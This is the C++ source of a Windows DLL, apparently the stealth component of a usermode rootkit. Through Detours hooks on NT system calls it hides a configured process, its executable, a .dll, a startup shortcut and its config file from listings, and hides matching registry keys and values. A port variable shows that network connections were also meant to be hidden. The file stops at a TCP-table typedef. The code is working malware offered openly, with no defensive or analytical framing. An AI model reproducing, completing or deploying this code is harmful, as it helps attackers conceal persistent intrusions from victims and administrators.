// dllmain.cpp
// Hooks: NtQuerySystemInformation (processes) + NtQueryDirectoryFile / NtQueryDirectoryFileEx (files)
// and registry hooks: NtQueryKey, NtEnumerateKey, NtEnumerateValueKey
// Logging to %TEMP%\ntqsi_hook.log

#include "pch.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <detours.h>
#include <iphlpapi.h>
#include <tcpmib.h>
#include <winsock2.h>

#pragma comment(lib, "detours.lib")

// ---- compatibility / missing defines ----
#ifndef STATUS_OBJECT_NAME_NOT_FOUND
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#endif
#ifndef STATUS_NO_MORE_ENTRIES
#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)
#endif

#ifndef FileDirectoryInformation
#define FileDirectoryInformation           1
#endif
#ifndef FileFullDirectoryInformation
#define FileFullDirectoryInformation       2
#endif
#ifndef FileBothDirectoryInformation
#define FileBothDirectoryInformation       3
#endif
#ifndef FileNamesInformation
#define FileNamesInformation               12
#endif
#ifndef FileIdBothDirectoryInformation
#define FileIdBothDirectoryInformation     37
#endif
#ifndef FileIdFullDirectoryInformation
#define FileIdFullDirectoryInformation     38
#endif
#ifndef FileIdExtdDirectoryInformation
#define FileIdExtdDirectoryInformation     39
#endif

// ---- small structures ----
typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, * PKEY_BASIC_INFORMATION;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_VALUE_BASIC_INFORMATION, * PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_NAME_INFORMATION {
    ULONG NameLength;
    WCHAR Name[1];
} KEY_NAME_INFORMATION, * PKEY_NAME_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataOffset;
    ULONG DataLength;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, * PKEY_VALUE_FULL_INFORMATION;

// file directory info minimal
typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength; // bytes
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, * PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength; // bytes
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, * PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength; // bytes
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;

// KEY info enums (some SDKs don't expose)
typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation = 0,
    KeyNodeInformation = 1,
    KeyFullInformation = 2,
    KeyNameInformation = 3,
    KeyCachedInformation = 4,
    KeyFlagsInformation = 5,
    KeyVirtualizationInformation = 6,
    KeyHandleTagsInformation = 7,
    KeyTrustInformation = 8,
    KeyLayerInformation = 9
} KEY_INFORMATION_CLASS;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation = 0,
    KeyValueFullInformation = 1,
    KeyValuePartialInformation = 2,
    KeyValueFullInformationAlign64 = 3,
    KeyValuePartialInformationAlign64 = 4,
    KeyValueLayerInformation = 5
} KEY_VALUE_INFORMATION_CLASS;

// ---- NT prototypes typedefs ----
typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
typedef NTSTATUS(NTAPI* NtQueryDirectoryFileEx_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING);
typedef NTSTATUS(NTAPI* NtQueryKey_t)(HANDLE, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtEnumerateKey_t)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtEnumerateValueKey_t)(HANDLE, ULONG, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);

// ---- originals ----
static NtQuerySystemInformation_t TrueNtQuerySystemInformation = nullptr;
static NtQueryDirectoryFile_t TrueNtQueryDirectoryFile = nullptr;
static NtQueryDirectoryFileEx_t TrueNtQueryDirectoryFileEx = nullptr;
static NtQueryKey_t TrueNtQueryKey = nullptr;
static NtEnumerateKey_t TrueNtEnumerateKey = nullptr;
static NtEnumerateValueKey_t TrueNtEnumerateValueKey = nullptr;

// ---- logging (debug only) ----
#ifdef _DEBUG
static CRITICAL_SECTION g_logCS;
static HANDLE g_hLogFile = INVALID_HANDLE_VALUE;

static void LogInit()
{
    InitializeCriticalSection(&g_logCS);
    CHAR tmpPath[MAX_PATH] = { 0 };
    if (GetTempPathA(MAX_PATH, tmpPath) == 0) strcpy_s(tmpPath, ".\\");
    CHAR logFile[MAX_PATH] = { 0 };
    sprintf_s(logFile, "%sntqsi_hook.log", tmpPath);
    g_hLogFile = CreateFileA(logFile, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        const char* hdr = "=== ntqsi_hook log started ===\r\n";
        DWORD w; WriteFile(g_hLogFile, hdr, (DWORD)strlen(hdr), &w, NULL);
    }
}

static void LogClose()
{
    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        const char* foot = "=== ntqsi_hook log ended ===\r\n";
        DWORD w; WriteFile(g_hLogFile, foot, (DWORD)strlen(foot), &w, NULL);
        CloseHandle(g_hLogFile);
        g_hLogFile = INVALID_HANDLE_VALUE;
    }
    DeleteCriticalSection(&g_logCS);
}

static void Logf(const char* fmt, ...)
{
    if (g_hLogFile == INVALID_HANDLE_VALUE) return;
    EnterCriticalSection(&g_logCS);
    char buf[2048];
    unsigned long long t = GetTickCount64();
    int n = sprintf_s(buf, "[%016llu] ", t);
    va_list ap; va_start(ap, fmt);
    vsnprintf_s(buf + n, sizeof(buf) - n, _TRUNCATE, fmt, ap);
    va_end(ap);
    strcat_s(buf, "\r\n");
    DWORD w; WriteFile(g_hLogFile, buf, (DWORD)strlen(buf), &w, NULL);
    LeaveCriticalSection(&g_logCS);
}
#else
static void LogInit() {}
static void LogClose() {}
static void Logf(const char*, ...) {}
#endif

// ---- dynamic patterns to hide (read from env vars set by stub) ----
static char g_procName[256] = { 0 };   // e.g. "runtimebroker"
static char g_fileName[256] = { 0 };   // e.g. "runtimebroker.exe"
static char g_regName[256] = { 0 };    // e.g. "runtimebroker"
static USHORT g_hiddenPort = 7777;

// Arrays built from env vars (up to 8 entries each)
static const char* g_hiddenProcesses[2] = { nullptr };
static size_t g_hiddenProcessCount = 0;

static char g_hiddenFileBuf[8][256];
static const char* g_hiddenFiles[8] = { nullptr };
static size_t g_hiddenFileCount = 0;

static const char* g_hiddenRegKeys[2] = { nullptr };
static size_t g_hiddenRegKeyCount = 0;

static const char* g_hiddenRegValues[2] = { nullptr };
static size_t g_hiddenRegValueCount = 0;

// ---- DLL instance ----
static HINSTANCE g_hInstance = NULL;

static void ToLowerInPlace(char* s) {
    for (; *s; ++s) *s = (char)tolower(*s);
}

// Get the directory where this DLL is located
static void GetDllDir(char* out, size_t outSize) {
    GetModuleFileNameA(g_hInstance, out, (DWORD)outSize);
    // Strip filename to get directory
    char* last = strrchr(out, '\\');
    if (last) *(last + 1) = '\0';
    else out[0] = '\0';
}

// Config file path: same folder as the DLL, named "s.cfg"
static void GetCfgPath(char* out, size_t outSize) {
    GetDllDir(out, outSize);
    strcat_s(out, outSize, "s.cfg");
}

static void InitHiddenNames() {
    // Read config from file next to DLL (written by stub before injection)
    char cfgPath[MAX_PATH];
    GetCfgPath(cfgPath, sizeof(cfgPath));
    HANDLE hFile = CreateFileA(cfgPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char buf[512] = { 0 };
        DWORD r; ReadFile(hFile, buf, sizeof(buf) - 1, &r, NULL);
        CloseHandle(hFile);
        buf[r] = '\0';

        // Parse: procName\nfileName\nregName\nport\n
        char* ctx = nullptr;
        char* line1 = strtok_s(buf, "\n", &ctx);
        char* line2 = strtok_s(NULL, "\n", &ctx);
        char* line3 = strtok_s(NULL, "\n", &ctx);
        char* line4 = strtok_s(NULL, "\n", &ctx);

        if (line1) { strcpy_s(g_procName, line1); ToLowerInPlace(g_procName); }
        if (line2) { strcpy_s(g_fileName, line2); ToLowerInPlace(g_fileName); }
        if (line3) { strcpy_s(g_regName, line3); ToLowerInPlace(g_regName); }
        if (line4) { int p = atoi(line4); if (p > 0 && p < 65536) g_hiddenPort = (USHORT)p; }

        Logf("Config read: proc=%s file=%s reg=%s port=%d from %s", g_procName, g_fileName, g_regName, (int)g_hiddenPort, cfgPath);
    } else {
        Logf("No config file at %s (GLE=%lu), hooks passive", cfgPath, GetLastError());
    }

    // Build arrays from loaded names
    if (g_procName[0]) {
        g_hiddenProcesses[0] = g_procName;
        g_hiddenProcessCount = 1;
    }

    if (g_fileName[0]) {
        g_hiddenFiles[0] = g_fileName;
        g_hiddenFileCount = 1;

        if (g_procName[0]) {
            // Hide: procname.dll, procname.lnk (startup shortcut), s.cfg, rt folder, log
            sprintf_s(g_hiddenFileBuf[1], "%s.dll", g_procName);
            g_hiddenFiles[g_hiddenFileCount++] = g_hiddenFileBuf[1];
            sprintf_s(g_hiddenFileBuf[2], "%s.lnk", g_procName);
            g_hiddenFiles[g_hiddenFileCount++] = g_hiddenFileBuf[2];
        }
        strcpy_s(g_hiddenFileBuf[3], "s.cfg");
        g_hiddenFiles[g_hiddenFileCount++] = g_hiddenFileBuf[3];
    }

    if (g_regName[0]) {
        g_hiddenRegKeys[0] = g_regName;
        g_hiddenRegKeyCount = 1;
        g_hiddenRegValues[0] = g_regName;
        g_hiddenRegValueCount = 1;
    }

    Logf("InitHiddenNames: proc=%s file=%s reg=%s port=%d",
        g_procName[0] ? g_procName : "(none)",
        g_fileName[0] ? g_fileName : "(none)",
        g_regName[0] ? g_regName : "(none)",
        (int)g_hiddenPort);
}

// ---- helper conversions & match ----
static void UnicodeToLowerAnsiSafe(const WCHAR* wname, ULONG wlenBytes, char* out, size_t outSize)
{
    if (!out) return;
    out[0] = '\0';
    if (!wname || wlenBytes == 0) return;
    int wcount = (int)(wlenBytes / sizeof(WCHAR));
    if (wcount <= 0) return;
    int len = WideCharToMultiByte(CP_ACP, 0, wname, wcount, out, (int)outSize - 1, NULL, NULL);
    if (len <= 0) { out[0] = '\0'; return; }
    out[len] = '\0';
    for (int i = 0; i < len; ++i) out[i] = (char)tolower(out[i]);
}

static bool MatchAnyLower(const char* nameLower, const char** list, size_t count)
{
    if (!nameLower) return false;
    for (size_t i = 0; i < count; ++i) {
        if (strstr(nameLower, list[i]) != NULL) return true;
    }
    return false;
}

// ---- HasPrefix checks both keys & values ----
// --- Helpers ---
// Compare si une cha�ne (ANSI lowercase) commence par un pr�fixe donn�
static bool StartsWithInsensitive(const char* str, const char* prefix)
{
    if (!str || !prefix) return false;
    size_t lenP = strlen(prefix);
    size_t lenS = strlen(str);
    if (lenP == 0 || lenS < lenP) return false;
    return (_strnicmp(str, prefix, lenP) == 0);
}

// V�rifie si un nom Unicode correspond au pr�fixe � cacher
static bool HasPrefix(const WCHAR* nameW, ULONG nameLenBytes)
{
    if (!nameW || nameLenBytes == 0) return false;
    char nameA[MAX_PATH] = { 0 };
    ULONG clamp = nameLenBytes;
    if (clamp > (ULONG)((MAX_PATH - 1) * sizeof(WCHAR))) clamp = (ULONG)((MAX_PATH - 1) * sizeof(WCHAR));
    UnicodeToLowerAnsiSafe(nameW, clamp, nameA, sizeof(nameA));

    return MatchAnyLower(nameA, g_hiddenRegKeys, g_hiddenRegKeyCount);
}


// ---- Process hook: NtQuerySystemInformation (hide processes) ----
NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS st = TrueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (NT_SUCCESS(st) && SystemInformationClass == SystemProcessInformation && SystemInformation) {
        PSYSTEM_PROCESS_INFORMATION cur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prev = NULL;

        while (TRUE) {
            if (cur->ImageName.Buffer && cur->ImageName.Length > 0) {
                // extract basename
                const WCHAR* src = cur->ImageName.Buffer;
                const WCHAR* last = src;
                int cnt = cur->ImageName.Length / sizeof(WCHAR);
                for (int i = 0; i < cnt; ++i) {
                    if (src[i] == L'\\' || src[i] == L'/') last = src + i + 1;
                }
                WCHAR baseW[MAX_PATH]; wcsncpy_s(baseW, MAX_PATH, last, _TRUNCATE);
                char nameA[MAX_PATH] = { 0 };
                WideCharToMultiByte(CP_ACP, 0, baseW, -1, nameA, MAX_PATH - 1, NULL, NULL);
                for (int i = 0; nameA[i]; ++i) nameA[i] = (char)tolower(nameA[i]);

                Logf("Process: \"%S\" -> \"%s\" (Offset=%lu)", cur->ImageName.Buffer, nameA, (unsigned long)cur->NextEntryOffset);

                if (MatchAnyLower(nameA, g_hiddenProcesses, g_hiddenProcessCount)) {
                    Logf("Hiding process: %s", nameA);
                    if (cur->NextEntryOffset == 0) {
                        if (prev) prev->NextEntryOffset = 0;
                    }
                    else {
                        if (prev) prev->NextEntryOffset += cur->NextEntryOffset;
                    }
                    // don't advance prev
                }
                else {
                    prev = cur;
                }
            }
            else {
                prev = cur;
            }

            if (cur->NextEntryOffset == 0) break;
            cur = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)cur + cur->NextEntryOffset);
        }
    }
    return st;
}

typedef NTSTATUS(NTAPI* NtGetNextProcess_t)(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
    );
static NtGetNextProcess_t TrueNtGetNextProcess = nullptr;

// compatibility: _countof fallback if not provided by CRT
#ifndef _countof
#define _countof(_Array) (sizeof(_Array) / sizeof((_Array)[0]))
#endif


NTSTATUS NTAPI HookedNtGetNextProcess(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
) {
    NTSTATUS st = TrueNtGetNextProcess(ProcessHandle, DesiredAccess, HandleAttributes, Flags, NewProcessHandle);
    if (!NT_SUCCESS(st) || NewProcessHandle == NULL || *NewProcessHandle == NULL) return st;

    // Try to obtain the image path safely (may fail due to permissions)
    WCHAR imagePath[MAX_PATH] = { 0 };
    DWORD size = _countof(imagePath);
    // QueryFullProcessImageNameW is Win32 and should work with a handle
    if (QueryFullProcessImageNameW(*NewProcessHandle, 0, imagePath, &size)) {
        // extract basename
        WCHAR* basename = wcsrchr(imagePath, L'\\');
        WCHAR nameW[MAX_PATH];
        if (basename) wcscpy_s(nameW, basename + 1);
        else wcscpy_s(nameW, imagePath);

        // lowercase and convert to ANSI for existing helpers
        char nameA[MAX_PATH];
        int len = WideCharToMultiByte(CP_ACP, 0, nameW, -1, nameA, sizeof(nameA), NULL, NULL);
        for (int i = 0; i < len; i++) nameA[i] = (char)tolower(nameA[i]);

        Logf("NtGetNextProcess: found %s", nameA);

        // If starts with $hydrax -> hide it
        if (MatchAnyLower(nameA, g_hiddenProcesses, g_hiddenProcessCount)) {
            Logf("Hiding process via NtGetNextProcess: %s", nameA);
            // close handle returned to caller (so caller doesn't see it)
            CloseHandle(*NewProcessHandle);
            *NewProcessHandle = NULL;
            return STATUS_NO_MORE_ENTRIES;
        }
    }

    return st;
}



// ---- Directory/folder filter core ----
static void FilterDirectoryBuffer(PVOID Buffer, ULONG Length, FILE_INFORMATION_CLASS InfoClass)
{
    if (!Buffer || Length == 0) return;
    PUCHAR base = (PUCHAR)Buffer;
    PUCHAR cur = base;
    PUCHAR end = base + Length;
    PUCHAR prev = NULL;

    while (cur + sizeof(ULONG) <= end) {
        ULONG nextOffset = *(ULONG*)(cur);
        // safety
        if (nextOffset != 0 && (cur + nextOffset > end || nextOffset > Length)) {
            Logf("FilterDirectoryBuffer: malformed next=%lu, aborting", nextOffset);
            break;
        }

        WCHAR* nameW = NULL;
        ULONG nameLen = 0;

        switch (InfoClass) {
        case FileBothDirectoryInformation: {
            PFILE_BOTH_DIR_INFORMATION e = (PFILE_BOTH_DIR_INFORMATION)cur;
            nameW = e->FileName; nameLen = e->FileNameLength;
            break;
        }
        case FileIdBothDirectoryInformation: {
            PFILE_ID_BOTH_DIR_INFORMATION e = (PFILE_ID_BOTH_DIR_INFORMATION)cur;
            nameW = e->FileName; nameLen = e->FileNameLength;
            break;
        }
        default: {
            PFILE_DIRECTORY_INFORMATION e = (PFILE_DIRECTORY_INFORMATION)cur;
            nameW = e->FileName; nameLen = e->FileNameLength;
            break;
        }
        }

        char nameA[MAX_PATH] = { 0 };
        if (nameW && nameLen > 0) {
            ULONG clamp = nameLen;
            if (clamp > (ULONG)((MAX_PATH - 1) * sizeof(WCHAR))) clamp = (ULONG)((MAX_PATH - 1) * sizeof(WCHAR));
            UnicodeToLowerAnsiSafe(nameW, clamp, nameA, sizeof(nameA));
        }

        Logf("DirEntry: '%s' (InfoClass=%d next=%lu)", nameA, (int)InfoClass, nextOffset);

        bool hide = false;
        if (nameA[0] != '\0') {
            // basename
            char* baseName = strrchr(nameA, '\\');
            if (!baseName) baseName = strrchr(nameA, '/');
            const char* target = baseName ? baseName + 1 : nameA;
            if (MatchAnyLower(target, g_hiddenFiles, g_hiddenFileCount)) hide = true;
        }

        if (hide) {
            Logf("Hiding file entry: %s", nameA);
            if (nextOffset == 0) {
                if (prev) *(ULONG*)prev = 0;
                else *(ULONG*)cur = 0;
                break;
            }
            else {
                if (prev) {
                    ULONG prevNext = *(ULONG*)prev;
                    if (prevNext == 0) *(ULONG*)prev = nextOffset;
                    else *(ULONG*)prev = prevNext + nextOffset;
                }
                else {
                    // remove head entry
                    PUCHAR src = cur + nextOffset;
                    ULONG remaining = (ULONG)(end - src);
                    memmove(cur, src, remaining);
                    end -= nextOffset;
                    Length -= nextOffset;
                    // cur now points to next entry (do not advance prev)
                    continue;
                }
            }
        }
        else {
            prev = cur;
        }

        if (nextOffset == 0) break;
        cur += nextOffset;
    }
}

// ---- NtQueryDirectoryFile hooks (apply filter) ----
NTSTATUS NTAPI HookedNtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS st = TrueNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

    if (NT_SUCCESS(st) && FileInformation && Length > 0) {
        switch (FileInformationClass) {
        case FileDirectoryInformation:
        case FileFullDirectoryInformation:
        case FileBothDirectoryInformation:
        case FileNamesInformation:
        case FileIdBothDirectoryInformation:
        case FileIdFullDirectoryInformation:
        case FileIdExtdDirectoryInformation:
            FilterDirectoryBuffer(FileInformation, Length, FileInformationClass);
            break;
        default:
            Logf("NtQueryDirectoryFile: class %d not handled", (int)FileInformationClass);
            break;
        }
    }

    return st;
}

NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName
) {
    NTSTATUS st = TrueNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName);

    if (NT_SUCCESS(st) && FileInformation && Length > 0) {
        switch (FileInformationClass) {
        case FileDirectoryInformation:
        case FileFullDirectoryInformation:
        case FileBothDirectoryInformation:
        case FileNamesInformation:
        case FileIdBothDirectoryInformation:
        case FileIdFullDirectoryInformation:
        case FileIdExtdDirectoryInformation:
            FilterDirectoryBuffer(FileInformation, Length, FileInformationClass);
            break;
        default:
            Logf("NtQueryDirectoryFileEx: class %d not handled", (int)FileInformationClass);
            break;
        }
    }

    return st;
}

// ---- TLS indices (globals) ----
static DWORD gTls_EnumerateKey_CacheKey = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateKey_CacheIndex = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateKey_CacheI = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateKey_CacheCorrected = TLS_OUT_OF_INDEXES;

static DWORD gTls_EnumerateValueKey_CacheKey = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateValueKey_CacheIndex = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateValueKey_CacheI = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateValueKey_CacheCorrected = TLS_OUT_OF_INDEXES;

// ---- NtQueryKey (safe: do not globally block KeyHandleTagsInformation) ----
NTSTATUS NTAPI HookedNtQueryKey(HANDLE Key, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength)
{
    NTSTATUS st = TrueNtQueryKey(Key, KeyInformationClass, KeyInformation, Length, ResultLength);
    if (!NT_SUCCESS(st) || !KeyInformation) return st;

    switch (KeyInformationClass) {
    case KeyNameInformation: {
        PKEY_NAME_INFORMATION info = (PKEY_NAME_INFORMATION)KeyInformation;
        char nameA[MAX_PATH] = { 0 };
        UnicodeToLowerAnsiSafe(info->Name, info->NameLength, nameA, sizeof(nameA));
        Logf("NtQueryKey(KeyNameInformation): %s", nameA);
        if (MatchAnyLower(nameA, g_hiddenRegKeys, g_hiddenRegKeyCount)) {
            Logf("Hiding key via NtQueryKey (NameInformation): %s", nameA);
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
        break;
    }
    case KeyBasicInformation: {
        PKEY_BASIC_INFORMATION info = (PKEY_BASIC_INFORMATION)KeyInformation;
        char nameA[MAX_PATH] = { 0 };
        UnicodeToLowerAnsiSafe(info->Name, info->NameLength, nameA, sizeof(nameA));
        Logf("NtQueryKey(KeyBasicInformation): %s", nameA);
        if (MatchAnyLower(nameA, g_hiddenRegKeys, g_hiddenRegKeyCount)) {
            Logf("Hiding key via NtQueryKey (BasicInformation): %s", nameA);
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
        break;
    }
    case KeyHandleTagsInformation:
        // don't block globally (fixes regedit)
        Logf("NtQueryKey(KeyHandleTagsInformation): passthrough");
        break;
    default:
        Logf("NtQueryKey: unhandled cls=%d", (int)KeyInformationClass);
        break;
    }

    return st;
}

// ---- NtEnumerateKey with TLS caching (O(N)) ----
NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE Key, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG KeyInformationLength, PULONG ResultLength)
{
    if (KeyInformationClass == KeyNodeInformation) {
        return TrueNtEnumerateKey(Key, Index, KeyInformationClass, KeyInformation, KeyInformationLength, ResultLength);
    }

    // TLS cached values
    HANDLE cacheKey = NULL;
    ULONG cacheIndex = 0, cacheI = 0, cacheCorrected = 0;
    if (gTls_EnumerateKey_CacheKey != TLS_OUT_OF_INDEXES) {
        cacheKey = (HANDLE)TlsGetValue(gTls_EnumerateKey_CacheKey);
        cacheIndex = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateKey_CacheIndex);
        cacheI = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateKey_CacheI);
        cacheCorrected = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateKey_CacheCorrected);
    }

    ULONG i = 0;
    ULONG corrected = 0;
    if (cacheKey == Key && Index > 0 && cacheIndex == Index - 1) {
        i = cacheI;
        corrected = cacheCorrected + 1;
    }

    BYTE tmp[1024];
    PKEY_BASIC_INFORMATION info = (PKEY_BASIC_INFORMATION)tmp;

    for (; i <= Index; corrected++) {
        NTSTATUS st = TrueNtEnumerateKey(Key, corrected, KeyBasicInformation, info, sizeof(tmp), ResultLength);
        if (!NT_SUCCESS(st)) {
            // fallback
            return TrueNtEnumerateKey(Key, corrected, KeyInformationClass, KeyInformation, KeyInformationLength, ResultLength);
        }
        if (!HasPrefix(info->Name, info->NameLength)) {
            i++;
        }
    }

    if (corrected > 0) corrected--;
    // store in TLS
    if (gTls_EnumerateKey_CacheKey != TLS_OUT_OF_INDEXES) {
        TlsSetValue(gTls_EnumerateKey_CacheKey, (PVOID)Key);
        TlsSetValue(gTls_EnumerateKey_CacheIndex, (PVOID)(ULONG_PTR)Index);
        TlsSetValue(gTls_EnumerateKey_CacheI, (PVOID)(ULONG_PTR)i);
        TlsSetValue(gTls_EnumerateKey_CacheCorrected, (PVOID)(ULONG_PTR)corrected);
    }

    return TrueNtEnumerateKey(Key, corrected, KeyInformationClass, KeyInformation, KeyInformationLength, ResultLength);
}

// ---- NtEnumerateValueKey with TLS caching (O(N)) ----
NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE Key, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG KeyValueInformationLength, PULONG ResultLength)
{
    // TLS cache
    HANDLE cacheKey = NULL;
    ULONG cacheIndex = 0, cacheI = 0, cacheCorrected = 0;
    if (gTls_EnumerateValueKey_CacheKey != TLS_OUT_OF_INDEXES) {
        cacheKey = (HANDLE)TlsGetValue(gTls_EnumerateValueKey_CacheKey);
        cacheIndex = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateValueKey_CacheIndex);
        cacheI = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateValueKey_CacheI);
        cacheCorrected = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateValueKey_CacheCorrected);
    }

    ULONG i = 0;
    ULONG corrected = 0;
    if (cacheKey == Key && Index > 0 && cacheIndex == Index - 1) {
        i = cacheI;
        corrected = cacheCorrected + 1;
    }

    BYTE tmp[2048];
    PKEY_VALUE_BASIC_INFORMATION vinfo = (PKEY_VALUE_BASIC_INFORMATION)tmp;

    for (; i <= Index; corrected++) {
        NTSTATUS st = TrueNtEnumerateValueKey(Key, corrected, KeyValueBasicInformation, vinfo, sizeof(tmp), ResultLength);
        if (!NT_SUCCESS(st)) {
            // fallback
            return TrueNtEnumerateValueKey(Key, corrected, KeyValueInformationClass, KeyValueInformation, KeyValueInformationLength, ResultLength);
        }
        if (!HasPrefix(vinfo->Name, vinfo->NameLength)) {
            i++;
        }
    }

    if (corrected > 0) corrected--;
    // store TLS
    if (gTls_EnumerateValueKey_CacheKey != TLS_OUT_OF_INDEXES) {
        TlsSetValue(gTls_EnumerateValueKey_CacheKey, (PVOID)Key);
        TlsSetValue(gTls_EnumerateValueKey_CacheIndex, (PVOID)(ULONG_PTR)Index);
        TlsSetValue(gTls_EnumerateValueKey_CacheI, (PVOID)(ULONG_PTR)i);
        TlsSetValue(gTls_EnumerateValueKey_CacheCorrected, (PVOID)(ULONG_PTR)corrected);
    }

    return TrueNtEnumerateValueKey(Key, corrected, KeyValueInformationClass, KeyValueInformation, KeyValueInformationLength, ResultLength);
}

// ---- TCP hook: hide connections on hidden port ----
typedef DWORD(WINAPI* GetExtendedTcpTable_t)(PVOID, PDWORD, BOOL, ULONG, TCP_TABLE_CLASS, ULONG);
